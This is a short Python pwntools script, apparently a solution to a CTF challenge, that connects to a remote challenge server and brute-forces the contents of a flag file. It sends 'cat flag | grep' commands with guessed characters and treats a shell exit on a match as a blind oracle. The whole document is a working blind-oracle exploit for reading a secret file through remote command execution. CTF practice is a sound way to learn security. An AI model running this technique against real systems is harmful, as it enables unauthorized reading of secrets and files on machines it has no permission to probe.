from pwn import *

io = remote('challs.ctf.m0lecon.it', 10000)

base = "cat flag | grep ptm{"
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_!?}"

i=0
while True:
	try:
		payload = base + charset[i]
		#print "[DEBUG] " + payload
		io.sendline(payload)
		s = io.recvline()
		#print "[DEBUG] " + s
		
		check = "if [ \"$?\" -eq 0 ]; then exit; fi"
		#print "[DEBUG] " + check
		io.sendline(check)
		s = io.recvline()
		#print "[DEBUG] " + s
		
		io.sendline()
		io.recvline()
		
		i+=1
	except:
		base += charset[i]
		print "l33t blind brute forcing " + base
		if charset[i] == "}":
			break
		i=-1
		io = remote('challs.ctf.m0lecon.it',10000)
print base
